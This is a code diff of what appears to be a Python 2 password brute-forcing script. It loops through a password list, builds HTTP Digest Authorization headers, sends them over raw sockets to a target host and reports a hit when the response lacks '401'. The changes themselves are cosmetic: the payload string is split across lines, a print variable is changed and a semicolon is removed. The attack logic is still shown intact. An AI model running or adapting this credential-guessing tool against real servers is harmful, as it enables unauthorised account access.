@@ -42,10 +42,14 @@ with open(passwords_file) as file:
 				continue
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((r_host, r_port))
-			payload = 'GET / HTTP/1.1\nHost: '+r_host+':'+str(r_port)+'\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140903 Firefox/24.0 Iceweasel/24.8.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nAuthorization: Digest username="'+username+'", realm="'+realm+'", nonce="'+nonce+'", uri="/", response="'+response+'"\n\n'
+			payload = 'GET / HTTP/1.1\nHost: '+r_host+':'+str(r_port)+'\nUser-Agent: Mozilla/5.0 ' \
+            '(X11; Linux x86_64; rv:24.0) Gecko/20140903 Firefox/24.0 Iceweasel/24.8.0\nAccept: ' \
+            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: ' \
+            'en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nAuthorization: ' \
+            'Digest username="'+username+'", realm="'+realm+'", nonce="'+nonce+'", uri="/", response="'+response+'"\n\n'
 			s.send(payload)
 			rec = s.recv(1024) #If there's nothing to receive, it will get stuck here...
-			print i, rec
+			print last_word_num, rec
 			last_word_num += 1
 			s.close()
 			if ("401" not in rec):
@@ -61,7 +65,7 @@ with open(passwords_file) as file:
 	else:
 		print "\n[-] Not found :("
 		exit(0)
-raw_input("\n[+] Found at " + last_word_num);
+raw_input("\n[+] Found at " + last_word_num)
 exit(1)
 
 
